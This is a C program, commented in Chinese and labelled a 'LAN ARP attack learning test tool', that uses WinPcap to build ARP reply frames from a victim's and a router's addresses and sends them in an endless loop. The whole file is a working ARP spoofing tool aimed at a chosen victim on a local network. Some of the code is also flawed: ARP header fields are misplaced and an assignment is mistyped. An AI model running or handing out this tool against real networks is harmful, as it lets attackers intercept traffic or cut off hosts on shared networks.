#include <stdlib.h>
#include <stdio.h>
#include <pcap.h>
#include <libnet.h>

int main(int argc, char **argv)
{
    pcap_t *fp;
    char errbuf[PCAP_ERRBUF_SIZE];
    u_char packet[100];
    int j;

    pcap_if_t *alldevs;
    pcap_if_t *d;
    int inum;
    int i=0,m,n;

    if (pcap_findalldevs_ex(PCAP_SRC_IF_STRING, NULL, &alldevs, errbuf) == -1)
    {
        fprintf(stderr,"Error in pcap_findalldevs: %s\n", errbuf);
        exit(1);
    }
    
    /* 打印列表 */
    for(d=alldevs; d; d=d->next)
    {
        printf("%d. %s", ++i, d->name);
        if (d->description)
            printf(" (%s)\n", d->description);
        else
            printf(" (No description available)\n");
    }
    
    if(i==0)
    {
        printf("\nNo interfaces found! Make sure WinPcap is installed.\n");
        return -1;
    }
    
    printf("Enter the interface number (1-%d):",i);
    scanf("%d", &inum);
    
    if(inum < 1 || inum > i)
    {
        printf("\nInterface number out of range.\n");
        /* 释放设备列表 */
        pcap_freealldevs(alldevs);
        return -1;
    }


	/* 跳转到选中的适配器 */
    for(d=alldevs, i=0; i< inum-1 ;d=d->next, i++);

    
    /* 打开输出设备 */
    if ( (fp= pcap_open(d=d->name,            // 设备名
                        100,                
                        PCAP_OPENFLAG_PROMISCUOUS,  
                        1000,               
                        NULL,               
                        errbuf              
                        ) ) == NULL)
    {
        fprintf(stderr,"\nUnable to open the adapter. %s is not supported by WinPcap\n", argv[1]);
        return;
    }
	printf("**********局域网ARP攻击学习测试工具************\n");

	/* 目的地址的MAC地址*/
	printf("请输入路由器的MAC地址（例FF:FF:FF:FF:FF:FF）\n");
	scanf("%2x:%2x:%2x:%2x:%2x:%2x",&packet[0],&packet[1],&packet[2],&packet[3],&packet[4],&packet[5]);

    

	/* 设置MAC源地址 */
	printf("请输入被攻击者ip的MAC地址（例FF:FF:FF:FF:FF:FF）\n");
	scanf("%2x:%2x:%2x:%2x:%2x:%2x",&packet[6],&packet[7],&packet[8],&packet[9],&packet[10],&packet[11]);
    
 
/* 帧类型  */


	packet[12]=0x08;
    packet[13]=0x06;

	/* 硬件类型  */
	packet[14]=0x00;
    packet[15]=0x01;

	/* 协议类型 */
	packet[16]=0x08;
    packet[17]=0x00;
	/* op */
	packet[18]=0x06;
    packet[19]=0x04;
    /*  ARP问答协议    */
	packet[20]=0x00;
	printf("请选择协议类型  1：询问   2：应答(攻击) \n ");
	scanf("%2x",&packet[21]);
   // packet[21]=0x02;



	for(i=22;i<28;i++)
		packet[i]=packet[i-16];



	printf("请输入被攻击者的ip地址\n");
	scanf("%d.%d.%d.%d",&packet[28],&packet[29],&packet[30],&packet[31]);



	for(i=32;i<38;i++)
		packet[i]=packet[i-32];





	printf("请输入路由器的ip地址\n");
	scanf("%d.%d.%d.%d",&packet[38],&packet[39],&packet[40],&packet[41]);



	for(j=42;j<60;j++)
	{
		packet[j]=0x00;
	}

	printf("Attacking %d.%d.%d.%d !",packet[28],packet[29],packet[30],packet[31]);

	
	
    while(1)
	{
	pcap_sendpacket(fp, packet, 60 /* size */);
	for(j=1000;j>0;j--)
		for(m=100;m>0;m--)
			for(n=300;n>0;n--);
	}

    /* 发送数据包 */
    if (pcap_sendpacket(fp, packet, 60 /* size */) != 0)
    {
        fprintf(stderr,"\nError sending the packet: \n", pcap_geterr(fp));
  
    }
	
	

    return 0;
}

